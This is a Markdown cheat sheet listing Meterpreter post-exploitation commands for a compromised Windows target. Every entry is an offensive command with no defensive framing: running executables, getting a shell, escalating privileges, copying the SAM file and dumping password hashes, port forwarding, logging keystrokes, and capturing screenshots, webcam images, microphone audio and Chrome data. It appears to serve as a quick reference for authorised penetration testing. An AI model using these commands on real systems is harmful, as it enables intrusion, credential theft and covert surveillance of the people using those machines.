### Meterpreter Cheat Sheet

| Command                                    | Description                                 |
| ------------------------------------------ | ------------------------------------------- |
| `upload file c:\\windows`                  | Upload file to Windows target               |
| `download c:\\windows\\repair\\sam /tmp`   | Download file from Windows target           |
| `execute -f c:\\windows\temp\exploit.exe`  | Run .exe on target                          |
| `execute -f cmd -c`                        | Creates new channel with cmd shell          |
| `ps`                                       | Show processes                              |
| `shell`                                    | Get shell on the target                     |
| `getsystem`                                | Attempts privilege escalation on the target |
| `hashdump`                                 | Dump the hashes on the target               |
| `portfwd add –l 3389 –p 3389 –r target`    | Create port forward to target machine       |
| `portfwd delete –l 3389 –p 3389 –r target` | Delete port forward                         |
| `screenshot`                               | Capture screenshot of the target machine    |
| `keyscan_start`                            | Start keylogger                             |
| `keyscan_dump`                             | Dump collected keystrokes                   |
| `webcam_snap`                              | Take webcam snapshot                        |
| `record_mic`                               | Record microphone                           |
| `enum_chrome`                              | Enumerate Chrome browser data               |